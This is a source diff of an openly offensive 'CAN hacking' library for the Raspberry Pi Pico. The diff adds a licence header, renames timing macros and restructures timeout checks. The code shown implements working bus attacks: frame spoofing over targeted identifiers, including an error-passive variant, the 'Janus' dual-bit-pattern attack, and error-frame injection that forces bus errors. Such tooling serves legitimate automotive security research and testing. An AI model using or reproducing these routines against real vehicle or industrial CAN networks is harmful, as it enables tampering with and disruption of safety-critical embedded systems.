@@ -1,7 +1,21 @@
+// Copyright 2020 Dr. Ken Tindell (https://kentindell.github.io)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
 // CAN hacking library. Targeted at the Raspberry Pi Pico board but should run on anything fast enough
 // with a pair of I/O pins.
-//
-// The library
 //
 // The Janus Attack sets the bit pattern as follows:
 //
@@ -41,7 +55,8 @@ struct canhack {
 struct canhack canhack;
 
 // Returns true if should re-enter arbitration due to lost arbitration and/or error.
-TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint8_t tx_index, uint32_t timeout, canhack_frame_t *frame)
+// Returns false if sent
+TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint8_t tx_index, canhack_frame_t *frame)
 {
     ctr_t now;
     uint32_t rx;
@@ -49,37 +64,37 @@ TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *
     uint8_t cur_tx = tx;
 
     for (;;) {
-        now = get_clock();
+        now = GET_CLOCK();
         // Bit end is scanned first because it needs to execute as close to the time as possible
-        if (reached(now, bit_end)) {
-            set_can_tx(tx);
-            bit_end = advance(bit_end, BIT_TIME);
+        if (REACHED(now, bit_end)) {
+            SET_CAN_TX(tx);
+            bit_end = ADVANCE(bit_end, BIT_TIME);
 
             // The next bit is set up after the time because the critical I/O operation has taken place now
             cur_tx = tx;
             tx = frame->tx_bitstream[tx_index++];
 
-            if ((tx_index >= frame->tx_bits) || (--timeout == 0)) {
+            if ((tx_index >= frame->tx_bits)) {
                 // Finished
-                set_can_tx_rec();
-                canhack_p->sent = timeout > 0;
+                SET_CAN_TX_REC();
+                canhack_p->sent = true;
                 return false;
             }
         }
-        if (reached(now, sample_point)) {
-            rx = get_can_rx();
+        if (REACHED(now, sample_point)) {
+            rx = GET_CAN_RX();
             if (rx != cur_tx) {
                 // If arbitration then lost, or an error, then give up and go back to SOF
-                set_can_tx_rec();
+                SET_CAN_TX_REC();
                 return true;
             }
-            sample_point = advance(sample_point, BIT_TIME);
+            sample_point = ADVANCE(sample_point, BIT_TIME);
         }
     }
 }
 
 // Sends a sequence of bits, returns true if lost arbitration or an error
-TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t split_end, uint32_t bit_time, struct canhack *canhack_p, uint8_t tx_index)
+TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t split_end, struct canhack *canhack_p, uint8_t tx_index)
 {
     ctr_t now;
     uint8_t rx;
@@ -89,41 +104,41 @@ TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t
 
     for (;;) {
         for (;;) {
-            now = get_clock();
+            now = GET_CLOCK();
             // Bit end is scanned first because it needs to execute as close to the time as possible
-            if (reached(now, bit_end)) {
+            if (REACHED(now, bit_end)) {
                 // Set a dominant state to force a sync (if previous sample was a 1) in all the CAN controllers
-                set_can_tx_dom();
+                SET_CAN_TX_DOM();
                 // The next bit is set up after the time because the critical I/O operation has taken place now
                 tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
-                bit_end = advance(bit_end, bit_time);
+                bit_end = ADVANCE(bit_end, BIT_TIME);
                 break;
             }
         }
         for (;;) {
-            now = get_clock();
-            if (reached(now, sync_end)) {
-                set_can_tx(tx1);
+            now = GET_CLOCK();
+            if (REACHED(now, sync_end)) {
+                SET_CAN_TX(tx1);
                 tx2 = canhack_p->can_frame2.tx_bitstream[tx_index];
                 tx_index++;
                 if (tx_index >= tx_bits) {
                     // Finished
-                    set_can_tx_rec();
+                    SET_CAN_TX_REC();
                     canhack_p->sent = true;
                     return false;
                 }
-                sync_end = advance(sync_end, bit_time);
+                sync_end = ADVANCE(sync_end, BIT_TIME);
                 break;
             }
         }
         for (;;) {
-            now = get_clock();
-            if (reached(now, split_end)) {
-                rx = get_can_rx();
-                set_can_tx(tx2);
-                split_end = advance(split_end, bit_time);
+            now = GET_CLOCK();
+            if (REACHED(now, split_end)) {
+                rx = GET_CAN_RX();
+                SET_CAN_TX(tx2);
+                split_end = ADVANCE(split_end, BIT_TIME);
                 if (rx != tx1) {
-                    set_can_tx_rec();
+                    SET_CAN_TX_REC();
                     return false;
                 }
                 break;
@@ -134,21 +149,21 @@ TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t
 
 TIME_CRITICAL void canhack_send_square_wave(void)
 {
-    reset_clock(0);
+    RESET_CLOCK(0);
     ctr_t now = 0;
     ctr_t bit_end = BIT_TIME;
     uint8_t tx = 0;
     uint32_t timeout = 160U;
 
     for (;;) {
-        now = get_clock();
+        now = GET_CLOCK();
 
-        if (reached(now, bit_end)) {
-            set_can_tx(tx);
-            bit_end = advance(now, BIT_TIME);
+        if (REACHED(now, bit_end)) {
+            SET_CAN_TX(tx);
+            bit_end = ADVANCE(now, BIT_TIME);
             tx ^= 1U; // Toggle bit
             if (--timeout == 0) {
-                set_can_tx_rec();
+                SET_CAN_TX_REC();
                 return;
             }
         }
@@ -173,16 +188,16 @@ TIME_CRITICAL void canhack_loopback(void)
     // This should output on to the debug pin any incoming CAN frame
     uint i = 160U;
     ctr_t bit_end = BIT_TIME;
-    reset_clock(0);
+    RESET_CLOCK(0);
     while(i > 0) {
-        set_debug(get_can_rx());
-        ctr_t now = get_clock();
-        if (reached(now, bit_end)) {
-            bit_end = advance(now, BIT_TIME);
+        SET_DEBUG(GET_CAN_RX());
+        ctr_t now = GET_CLOCK();
+        if (REACHED(now, bit_end)) {
+            bit_end = ADVANCE(now, BIT_TIME);
             i--;
         }
     }
-    set_can_tx_rec();
+    SET_CAN_TX_REC();
 }
 
 // Sends frame 1, returns true if sent (false if a timeout or too many retries)
@@ -195,33 +210,29 @@ TIME_CRITICAL bool canhack_send_frame(uint32_t timeout, uint32_t retries)
 
     // Look for 11 recessive bits or 10 recessive bits and a dominant
     uint8_t rx;
-    reset_clock(0);
+    RESET_CLOCK(0);
     ctr_t now;
     ctr_t sample_point = SAMPLE_POINT_OFFSET;
 
 SOF:
     for (;;) {
-        rx = get_can_rx();
-        now = get_clock();
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
 
         if (prev_rx && !rx) {
-            reset_clock(0);
+            RESET_CLOCK(0);
             sample_point = SAMPLE_POINT_OFFSET;
         }
-        else if (reached(now, sample_point)) {
+        else if (REACHED(now, sample_point)) {
             ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
-            sample_point = advance(now, BIT_TIME);
+            sample_point = ADVANCE(now, BIT_TIME);
 
-            if (--timeout == 0) {
-                set_can_tx_rec();
-                return false;
-            }
             bitstream = (bitstream << 1U) | rx;
             if ((bitstream & 0x7feU) == 0x7feU) {
                 // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                 // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                 tx_index = rx ^ 1U;
-                if (send_bits(bit_end, sample_point, canhack_p, tx_index, timeout, &canhack_p->can_frame1)) {
+                if (send_bits(bit_end, sample_point, canhack_p, tx_index, &canhack_p->can_frame1)) {
                     if (retries--) {
                         bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                         goto SOF;
@@ -232,6 +243,10 @@ SOF:
             }
         }
         prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
     }
 }
 
@@ -247,33 +262,29 @@ TIME_CRITICAL bool canhack_send_janus_frame(uint32_t timeout, ctr_t sync_time, c
 
     // Look for 11 recessive bits or 10 recessive bits and a dominant
     uint8_t rx;
-        ctr_t now = get_clock();
+        ctr_t now = GET_CLOCK();
     ctr_t sample_point = now + SAMPLE_POINT_OFFSET;
 
 SOF:
     for (;;) {
-        rx = get_can_rx();
-        now = get_clock();
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
 
         if (prev_rx && !rx) {
-            reset_clock(0);
+            RESET_CLOCK(0);
             sample_point = SAMPLE_POINT_OFFSET;
         }
-        else if (reached(now, sample_point)) {
-            if (--timeout == 0) {
-                set_can_tx_rec();
-                return false;
-            }
+        else if (REACHED(now, sample_point)) {
             bitstream = (bitstream << 1U) | rx;
             uint32_t bit_end = sample_point + SAMPLE_TO_BIT_END;
-            sample_point = advance(sample_point, BIT_TIME);
+            sample_point = ADVANCE(sample_point, BIT_TIME);
             if ((bitstream & 0x7feU) == 0x7feU) {
-                sync_time = advance(sync_time, bit_end);
-                split_time = advance(split_time, bit_end);
+                sync_time = ADVANCE(sync_time, bit_end);
+                split_time = ADVANCE(split_time, bit_end);
                 // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                 // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                 tx_index = rx ^ 1U;
-                if (send_janus_bits(bit_end, sync_time, split_time, BIT_TIME, canhack_p, tx_index)) {
+                if (send_janus_bits(bit_end, sync_time, split_time, canhack_p, tx_index)) {
                     if (retries--) {
                         bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                         goto SOF;
@@ -286,6 +297,10 @@ SOF:
             }
         }
         prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
     }
 }
 
@@ -315,25 +330,21 @@ TIME_CRITICAL bool canhack_spoof_frame(uint32_t timeout, bool janus, ctr_t sync_
     uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;
 
     uint8_t rx;
-    reset_clock(0);
+    RESET_CLOCK(0);
     ctr_t now;
     ctr_t sample_point = SAMPLE_POINT_OFFSET;
 
     for (;;) {
-        rx = get_can_rx();
-        now = get_clock();
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
 
         // This in effect is the bus integration phase of CAN
         if (prev_rx && !rx) {
-            reset_clock(0);
+            RESET_CLOCK(0);
             sample_point = SAMPLE_POINT_OFFSET;
         }
-        else if (reached(now, sample_point)) {
-            if (--timeout == 0) {
-                set_can_tx_rec();
-                return false;
-            }
-            sample_point = advance(sample_point, BIT_TIME);
+        else if (REACHED(now, sample_point)) {
+            sample_point = ADVANCE(sample_point, BIT_TIME);
             bitstream = (bitstream << 1U) | rx;
             // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
             if ((bitstream & bitstream_mask) == bitstream_match) {
@@ -346,10 +357,15 @@ TIME_CRITICAL bool canhack_spoof_frame(uint32_t timeout, bool janus, ctr_t sync_
             }
         }
         prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
     }
  }
 
 // Wait for a targeted frame and then transmit the spoof frame over the top of the targeted frame
+// Returns true if the frame was sent OK, false if there was an error or a timeout
 TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t timeout)
 {
     uint32_t prev_rx = 1U;
@@ -359,33 +375,33 @@ TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t timeout)
     uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;
 
     uint8_t rx;
-    reset_clock(0);
+    RESET_CLOCK(0);
     ctr_t now;
     ctr_t sample_point = SAMPLE_POINT_OFFSET;
 
     for (;;) {
-        rx = get_can_rx();
-        now = get_clock();
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
 
         if (prev_rx && !rx) {
-            reset_clock(0);
+            RESET_CLOCK(0);
             sample_point = SAMPLE_POINT_OFFSET;
         }
-        else if (reached(now, sample_point)) {
-            if (--timeout == 0) {
-                set_can_tx_rec();
-                return false;
-            }
+        else if (REACHED(now, sample_point)) {
             ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
-            sample_point = advance(sample_point, BIT_TIME);
+            sample_point = ADVANCE(sample_point, BIT_TIME);
             bitstream = (bitstream << 1U) | rx;
             // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
             if ((bitstream & bitstream_mask) == bitstream_match) {
-                send_bits(bit_end, sample_point, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, timeout, &canhack.can_frame1);
+                send_bits(bit_end, sample_point, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, &canhack.can_frame1);
                 return canhack_p->sent;
             }
         }
         prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
     }
 }
 
@@ -398,32 +414,32 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool 
     uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;
 
     uint8_t rx;
-    reset_clock(0);
+    RESET_CLOCK(0);
     ctr_t now;
     ctr_t sample_point = SAMPLE_POINT_OFFSET;
     ctr_t bit_end;
 
     for (;;) {
-        now = get_clock();
-        rx = get_can_rx();
+        now = GET_CLOCK();
+        rx = GET_CAN_RX();
         if (prev_rx && !rx) {
-            reset_clock(FALLING_EDGE_RECALIBRATE);
+            RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
             sample_point = SAMPLE_POINT_OFFSET;
         }
-        else if (reached(now, sample_point)) {
+        else if (REACHED(now, sample_point)) {
             bitstream64 = (bitstream64 << 1U) | rx;
             bit_end = sample_point + SAMPLE_TO_BIT_END;
-            sample_point = advance(sample_point, BIT_TIME);
+            sample_point = ADVANCE(sample_point, BIT_TIME);
             // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
             if ((bitstream64 & bitstream64_mask) == bitstream64_match) {
                 break;
                 // Now want to inject an (optional) error frame
             }
-            if (--timeout == 0) {
-                return false;
-            }
         }
         prev_rx = rx;
+        if (--timeout == 0) {
+            return false;
+        }
     }
 
     // bit_end is in the future, sample_point is after bit_end
@@ -431,18 +447,18 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool 
     // Inject an error frame
     if (inject_error) {
         for (;;) {
-            now = get_clock();
-            if (reached(now, bit_end)) {
-                set_can_tx_dom();
+            now = GET_CLOCK();
+            if (REACHED(now, bit_end)) {
+                SET_CAN_TX_DOM();
                 break;
             }
         }
-        bit_end = advance(bit_end, BIT_TIME * 6U);
-        sample_point = advance(sample_point, BIT_TIME * 6U);
+        bit_end = ADVANCE(bit_end, BIT_TIME * 6U);
+        sample_point = ADVANCE(sample_point, BIT_TIME * 6U);
         for (;;) {
-            now = get_clock();
-            if (reached(now, bit_end)) {
-                set_can_tx_rec();
+            now = GET_CLOCK();
+            if (REACHED(now, bit_end)) {
+                SET_CAN_TX_REC();
                 break;
             }
         }
@@ -453,33 +469,33 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool 
 
     for (uint32_t i = 0; i < repeat; i++) {
         for (;;) {
-            now = get_clock();
-            rx = get_can_rx();
+            now = GET_CLOCK();
+            rx = GET_CAN_RX();
             if (prev_rx && !rx) {
-                reset_clock(FALLING_EDGE_RECALIBRATE);
+                RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
                 sample_point = SAMPLE_POINT_OFFSET;
             }
-            else if (reached(now, sample_point)) {
+            else if (REACHED(now, sample_point)) {
                 bitstream32 = (bitstream32 << 1U) | rx;
                 bit_end = sample_point + SAMPLE_TO_BIT_END;
-                sample_point = advance(sample_point, BIT_TIME);
+                sample_point = ADVANCE(sample_point, BIT_TIME);
                 if ((bitstream32 & eof_mask) == eof_match) {
                     // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                     // error passive and do not signal active error frames)
                     for (;;) {
-                        now = get_clock();
-                        if (reached(now, bit_end)) {
-                            set_can_tx_dom();
-                            bit_end = advance(bit_end, BIT_TIME * 7U);
-                            sample_point = advance(sample_point, BIT_TIME * 7U);
+                        now = GET_CLOCK();
+                        if (REACHED(now, bit_end)) {
+                            SET_CAN_TX_DOM();
+                            bit_end = ADVANCE(bit_end, BIT_TIME * 7U);
+                            sample_point = ADVANCE(sample_point, BIT_TIME * 7U);
                             bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
                             break;
                         }
                     }
                     for (;;) {
-                        now = get_clock();
-                        if (reached(now, bit_end)) {
-                            set_can_tx_rec();
+                        now = GET_CLOCK();
+                        if (REACHED(now, bit_end)) {
+                            SET_CAN_TX_REC();
                             break;
                         }
                     }
